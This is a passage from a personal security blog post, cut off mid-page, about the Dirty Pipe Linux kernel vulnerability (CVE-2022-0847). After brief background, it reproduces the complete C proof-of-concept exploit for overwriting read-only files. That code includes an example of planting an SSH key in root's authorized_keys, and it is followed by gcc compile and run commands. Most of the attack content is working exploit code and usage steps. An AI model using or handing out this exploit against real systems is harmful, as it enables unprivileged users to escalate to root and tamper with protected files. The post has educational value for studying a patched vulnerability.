<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>The Dirty Pipe Vulnerability On Linux - Offensive Blogs</title><meta name="description" content="Hi, folks. I wanna talk about CVE-2022–0847. &amp; it's called&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://sakibulalikhan.github.io/the-dirty-pipe-vulnerability-on-linux.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.github.io/feed.json"><meta property="og:title" content="The Dirty Pipe Vulnerability On Linux - Offensive Blogs "><meta property="og:image" content="https://sakibulalikhan.github.io/media/posts/2/The-Dirty-Pipe.jpg"><meta property="og:image:width" content="474"><meta property="og:image:height" content="284"><meta property="og:site_name" content="Offensive Blogs"><meta property="og:description" content="Hi, folks. I wanna talk about CVE-2022–0847. &amp; it's called&hellip;"><meta property="og:url" content="https://sakibulalikhan.github.io/the-dirty-pipe-vulnerability-on-linux.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="The Dirty Pipe Vulnerability On Linux - Offensive Blogs "><meta name="twitter:description" content="Hi, folks. I wanna talk about CVE-2022–0847. &amp; it's called&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.github.io/media/posts/2/The-Dirty-Pipe.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/media/website/avatar.png" type="image/png"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/media/website/avatar.png" type="image/png"><link rel="stylesheet" href="https://sakibulalikhan.github.io/assets/css/style.css?v=af2a3de25879b28da182667ee98b43c8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.github.io/the-dirty-pipe-vulnerability-on-linux.html"},"headline":"The Dirty Pipe Vulnerability On Linux","datePublished":"2023-08-19T02:03","dateModified":"2023-08-19T03:14","image":{"@type":"ImageObject","url":"https://sakibulalikhan.github.io/media/posts/2/The-Dirty-Pipe.jpg","height":284,"width":474},"description":"Hi, folks. I wanna talk about CVE-2022–0847. &amp; it's called&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.github.io/authors/sakibulalikhan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body><header class="header" id="js-header"><a href="https://sakibulalikhan.github.io/" class="logo">Offensive Blogs</a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.github.io/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.github.io/aboutme.html" target="_self">About Me</a></li><li><a href="https://sakibulalikhan.github.io/tags/ctf-writeup/" target="_self">CTF Writeups</a></li></ul></nav></header><main><div class="wrapper"><article class="post"><header class="post__header"><a href="https://sakibulalikhan.github.io/tags/linux-privilege-escalation/" class="post__maintag">Linux Privilege Escalation</a><h1 class="post__title">The Dirty Pipe Vulnerability On Linux</h1><div class="post__meta"><div class="post__author">By <a href="https://sakibulalikhan.github.io/authors/sakibulalikhan/" class="invert" rel="author" title="Sakibul Ali Khan">Sakibul Ali Khan</a></div><time datetime="2023-08-19T02:03">August 19, 2023</time></div></header><figure class="post__featured-image"><img src="https://sakibulalikhan.github.io/media/posts/2/The-Dirty-Pipe.jpg" srcset="https://sakibulalikhan.github.io/media/posts/2/responsive/The-Dirty-Pipe-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/2/responsive/The-Dirty-Pipe-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/2/responsive/The-Dirty-Pipe-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/2/responsive/The-Dirty-Pipe-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="eager" height="284" width="474" alt="The Dirty Pipe Vulnerability On Linux"></figure><div class="post__inner"><div class="post__entry"><p id="1fb8" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hi, folks. I wanna talk about <a class="af rn" href="https://nvd.nist.gov/vuln/detail/cve-2022-0847" rel="noopener ugc nofollow" target="_blank">CVE-2022–0847</a>. &amp; it's called Dirty pipe vulnerability. This is a vulnerability in the Linux kernel since 5.8 which allows overwriting data in arbitrary read-only files. This leads to privilege escalation because unprivileged processes can inject code into root processes.</p><p id="628e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The vulnerability was discovered by Max Kellermann in April 2021. The bug report, exploit, and patch was sent to the <a class="af rn" href="https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html" rel="noopener ugc nofollow" target="_blank">Linux kernel security team</a> by Kellermann on February 20. The bug was reproduced on Google Pixel 6 and a bug report was sent to the Android Security Team.</p><p id="8352" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">He also sends mail to oss-security about the vulnerability he found.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km amw"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CoOqoghwTFDNxE8tGfnvFg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*CoOqoghwTFDNxE8tGfnvFg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*CoOqoghwTFDNxE8tGfnvFg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*CoOqoghwTFDNxE8tGfnvFg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*CoOqoghwTFDNxE8tGfnvFg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*CoOqoghwTFDNxE8tGfnvFg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*CoOqoghwTFDNxE8tGfnvFg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*CoOqoghwTFDNxE8tGfnvFg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*CoOqoghwTFDNxE8tGfnvFg.png" alt="Dirty pipe POC" width="700" height="413" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="29f0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This vulnerability is similar to <a class="af rn" href="https://dirtycow.ninja/" rel="noopener ugc nofollow" target="_blank">CVE-2016–5195 “Dirty Cow”</a> but is easier to exploit. The vulnerability <a class="af rn" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903" rel="noopener ugc nofollow" target="_blank">was fixed</a> in Linux 5.16.11, 5.15.25, and 5.10.102.</p><p id="d369" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">I don’t go deep about the vulnerability, because he did that perfectly. You can find that here <a class="af rn" href="https://dirtypipe.cm4all.com/" rel="noopener ugc nofollow" target="_blank">https://dirtypipe.cm4all.com/</a></p><p id="7c56" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">I just show you how can you exploit through this POC code…</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="50ae" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph=""><em class="abt">/* SPDX-License-Identifier: GPL-2.0 */</em><br><em class="abt">/*</em><br><em class="abt"> * Copyright 2022 CM4all GmbH / IONOS SE</em><br><em class="abt"> *</em><br><em class="abt"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</em><br><em class="abt"> *</em><br><em class="abt"> * Proof-of-concept exploit for the Dirty Pipe</em><br><em class="abt"> * vulnerability (CVE-2022-0847) caused by an uninitialized</em><br><em class="abt"> * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any</em><br><em class="abt"> * file contents in the page cache, even if the file is not permitted</em><br><em class="abt"> * to be written, immutable or on a read-only mount.</em><br><em class="abt"> *</em><br><em class="abt"> * This exploit requires Linux 5.8 or later; the code path was made</em><br><em class="abt"> * reachable by commit f6dd975583bd ("pipe: merge</em><br><em class="abt"> * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was</em><br><em class="abt"> * there before, it just provided an easy way to exploit it.</em><br><em class="abt"> *</em><br><em class="abt"> * There are two major limitations of this exploit: the offset cannot</em><br><em class="abt"> * be on a page boundary (it needs to write one byte before the offset</em><br><em class="abt"> * to add a reference to this page to the pipe), and the write cannot</em><br><em class="abt"> * cross a page boundary.</em><br><em class="abt"> *</em><br><em class="abt"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'</em><br><em class="abt"> *</em><br><em class="abt"> * Further explanation: https://dirtypipe.cm4all.com/</em><br><em class="abt"> */</em><br><br>#define _GNU_SOURCE<br>#include <em class="abt">&lt;unistd.h&gt;</em><br>#include <em class="abt">&lt;fcntl.h&gt;</em><br>#include <em class="abt">&lt;stdio.h&gt;</em><br>#include <em class="abt">&lt;stdlib.h&gt;</em><br>#include <em class="abt">&lt;string.h&gt;</em><br>#include <em class="abt">&lt;sys/stat.h&gt;</em><br>#include <em class="abt">&lt;sys/user.h&gt;</em><br><br>#ifndef PAGE_SIZE<br>#define PAGE_SIZE 4096<br>#endif<br><br><em class="abt">/**</em><br><em class="abt"> * Create a pipe where all "bufs" on the pipe_inode_info ring have the</em><br><em class="abt"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</em><br><em class="abt"> */</em><br><strong class="abp kz">static</strong> void prepare_pipe(int p[2])<br>{<br>	<strong class="abp kz">if</strong> (pipe(p)) abort();<br><br>	<strong class="abp kz">const</strong> unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);<br>	<strong class="abp kz">static</strong> char buffer[4096];<br><br>	<em class="abt">/* fill the pipe completely; each pipe_buffer will now have</em><br><em class="abt">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</em><br>	<strong class="abp kz">for</strong> (unsigned r = pipe_size; r &gt; 0;) {<br>		unsigned n = r &gt; <strong class="abp kz">sizeof</strong>(buffer) ? <strong class="abp kz">sizeof</strong>(buffer) : r;<br>		write(p[1], buffer, n);<br>		r -= n;<br>	}<br><br>	<em class="abt">/* drain the pipe, freeing all pipe_buffer instances (but</em><br><em class="abt">	   leaving the flags initialized) */</em><br>	<strong class="abp kz">for</strong> (unsigned r = pipe_size; r &gt; 0;) {<br>		unsigned n = r &gt; <strong class="abp kz">sizeof</strong>(buffer) ? <strong class="abp kz">sizeof</strong>(buffer) : r;<br>		read(p[0], buffer, n);<br>		r -= n;<br>	}<br><br>	<em class="abt">/* the pipe is now empty, and if somebody adds a new</em><br><em class="abt">	   pipe_buffer without initializing its "flags", the buffer</em><br><em class="abt">	   will be mergeable */</em><br>}<br><br>int main(int argc, char **argv)<br>{<br>	<strong class="abp kz">if</strong> (argc != 4) {<br>		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA<strong class="abp kz">\n</strong>", argv[0]);<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* dumb command-line argument parser */</em><br>	<strong class="abp kz">const</strong> char *<strong class="abp kz">const</strong> path = argv[1];<br>	loff_t offset = strtoul(argv[2], NULL, 0);<br>	<strong class="abp kz">const</strong> char *<strong class="abp kz">const</strong> data = argv[3];<br>	<strong class="abp kz">const</strong> size_t data_size = strlen(data);<br><br>	<strong class="abp kz">if</strong> (offset % PAGE_SIZE == 0) {<br>		fprintf(stderr, "Sorry, cannot start writing at a page boundary<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">const</strong> loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;<br>	<strong class="abp kz">const</strong> loff_t end_offset = offset + (loff_t)data_size;<br>	<strong class="abp kz">if</strong> (end_offset &gt; next_page) {<br>		fprintf(stderr, "Sorry, cannot write across a page boundary<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* open the input file and validate the specified offset */</em><br>	<strong class="abp kz">const</strong> int fd = open(path, O_RDONLY); <em class="abt">// yes, read-only! :-)</em><br>	<strong class="abp kz">if</strong> (fd &lt; 0) {<br>		perror("open failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">struct</strong> <strong class="abp kz">stat</strong> st;<br>	<strong class="abp kz">if</strong> (fstat(fd, &amp;st)) {<br>		perror("stat failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">if</strong> (offset &gt; st.st_size) {<br>		fprintf(stderr, "Offset is not inside the file<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">if</strong> (end_offset &gt; st.st_size) {<br>		fprintf(stderr, "Sorry, cannot enlarge the file<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* create the pipe with all flags initialized with</em><br><em class="abt">	   PIPE_BUF_FLAG_CAN_MERGE */</em><br>	int p[2];<br>	prepare_pipe(p);<br><br>	<em class="abt">/* splice one byte from before the specified offset into the</em><br><em class="abt">	   pipe; this will add a reference to the page cache, but</em><br><em class="abt">	   since copy_page_to_iter_pipe() does not initialize the</em><br><em class="abt">	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */</em><br>	--offset;<br>	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);<br>	<strong class="abp kz">if</strong> (nbytes &lt; 0) {<br>		perror("splice failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br>	<strong class="abp kz">if</strong> (nbytes == 0) {<br>		fprintf(stderr, "short splice<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* the following write will not create a new pipe_buffer, but</em><br><em class="abt">	   will instead write into the page cache, because of the</em><br><em class="abt">	   PIPE_BUF_FLAG_CAN_MERGE flag */</em><br>	nbytes = write(p[1], data, data_size);<br>	<strong class="abp kz">if</strong> (nbytes &lt; 0) {<br>		perror("write failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br>	<strong class="abp kz">if</strong> ((size_t)nbytes &lt; data_size) {<br>		fprintf(stderr, "short write<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	printf("It worked!<strong class="abp kz">\n</strong>");<br>	<strong class="abp kz">return</strong> EXIT_SUCCESS;<br>}</span></pre><p id="17a9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In your Linux system fire terminal and open nano &amp; save the above code like dirty_pipe.c .</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km amx"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fu1-454ZkR6AUwXiOLk73g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*fu1-454ZkR6AUwXiOLk73g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fu1-454ZkR6AUwXiOLk73g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fu1-454ZkR6AUwXiOLk73g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fu1-454ZkR6AUwXiOLk73g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fu1-454ZkR6AUwXiOLk73g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fu1-454ZkR6AUwXiOLk73g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*fu1-454ZkR6AUwXiOLk73g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*fu1-454ZkR6AUwXiOLk73g.png" alt="" width="700" height="189" loading="lazy" data-is-external-image="true"></figure></div></div><figcaption class="yz za zb kl km zc zd be b bf z dl" data-selectable-paragraph="">nano diry_pipe.c</figcaption></figure><p id="2831" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now make a private text file with sudo command, because with this exploit we try to change the read-only file as a nonprevilius user.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km amx"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3sipskKsazczKZU6nbW4UQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*3sipskKsazczKZU6nbW4UQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*3sipskKsazczKZU6nbW4UQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*3sipskKsazczKZU6nbW4UQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*3sipskKsazczKZU6nbW4UQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*3sipskKsazczKZU6nbW4UQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*3sipskKsazczKZU6nbW4UQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*3sipskKsazczKZU6nbW4UQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*3sipskKsazczKZU6nbW4UQ.png" alt="" width="700" height="225" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="b19d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now with gcc we compile our exploit. For this the command is…</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="ad36" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$gcc dirty_pipe.c -o dirty_pipe</span></pre><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km amy"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ujnCSr9la4o6xW3Dz0zxzA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ujnCSr9la4o6xW3Dz0zxzA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ujnCSr9la4o6xW3Dz0zxzA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ujnCSr9la4o6xW3Dz0zxzA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ujnCSr9la4o6xW3Dz0zxzA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ujnCSr9la4o6xW3Dz0zxzA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ujnCSr9la4o6xW3Dz0zxzA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ujnCSr9la4o6xW3Dz0zxzA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ujnCSr9la4o6xW3Dz0zxzA.png" alt="" width="700" height="253" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="1a2b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we try to edit the looked file with nonprevilius user. For that, we gonna do..</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="bf27" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$./dirty_pipe private.txt 1 'your text'</span></pre><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km amz"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QiOVCmqimzg3FZntsEGXcA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*QiOVCmqimzg3FZntsEGXcA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*QiOVCmqimzg3FZntsEGXcA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*QiOVCmqimzg3FZntsEGXcA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*QiOVCmqimzg3FZntsEGXcA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*QiOVCmqimzg3FZntsEGXcA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*QiOVCmqimzg3FZntsEGXcA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*QiOVCmqimzg3FZntsEGXcA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 